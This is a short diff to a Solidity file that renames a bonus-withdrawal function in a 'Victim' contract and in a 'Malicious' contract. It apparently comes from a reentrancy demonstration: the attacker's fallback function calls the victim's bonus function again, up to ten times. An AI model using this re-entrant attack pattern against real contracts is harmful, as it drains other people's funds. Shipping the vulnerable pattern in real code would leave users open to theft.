@@ -21,7 +21,7 @@ contract Victim{
       }
   }
 
-  function GetFirstWithdrawalBonus(address recipient) public {
+  function GetFirstWithdrawBonus(address recipient) public {
       if (claimedBonus[recipient] == false) {
            throw;
       }
@@ -47,13 +47,13 @@ contract Malicious{
  }
  
  function attack(){
-  vul.GetFirstWithdrawalBonus(_owner);
+  vul.GetFirstWithdrawBonus(_owner);
  }
  
  function () payable{
   count++;
   if(count < 10){
-    vul.GetFirstWithdrawalBonus(_owner);
+    vul.GetFirstWithdrawBonus(_owner);
   }
  }
 }
